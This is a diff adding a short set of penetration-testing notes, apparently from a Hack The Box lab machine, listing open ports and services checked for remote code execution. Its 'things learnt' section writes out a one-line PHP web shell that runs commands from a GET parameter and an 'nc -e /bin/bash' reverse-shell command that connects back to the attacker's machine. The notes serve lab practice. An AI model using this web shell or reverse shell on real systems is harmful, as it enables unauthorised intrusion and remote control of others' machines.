@@ -1,0 +1,22 @@
+ip:10.10.10.29
+ports:22,80,53
+
+Apache 2.4.7 ---could not find  rce
+SSH --- could not find  rce
+DNS -- couldnt find rce
+
+
+Things learnt:
+
+always add the ip of machine in htb to /etc/hosts --- make this a habit
+dont use the php shell from msfvenom bcoz we cant get interactive shell
+from it
+
+instead use
+
+<?php echo (system($_GET['execute'])); ?>
+This executes command which we can pass through the execute command
+command: nc -e /bin/bash ip of our machine port
+
+This makes the victim to connect back to us so setup a listener
+
